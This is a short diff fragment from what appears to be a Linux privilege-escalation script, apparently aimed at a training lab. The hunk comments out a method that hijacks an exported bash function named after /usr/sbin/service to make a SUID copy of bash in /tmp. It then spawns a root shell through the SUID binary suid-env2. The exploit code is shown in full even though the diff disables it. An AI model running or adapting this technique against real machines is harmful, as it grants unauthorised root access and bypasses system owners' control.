@@ -82,9 +82,9 @@ then
 elif [[ $method -eq 11 ]] ;
 then
 print "SUID Bin and ev method 2";
-function /usr/sbin/service\(\) { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; \}
-export -f /usr/sbin/service
-/usr/local/bin/suid-env2
+#function /usr/sbin/service\(\) { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; \}
+#export -f /usr/sbin/service
+#/usr/local/bin/suid-env2
 else
 echo 'non'
 fi
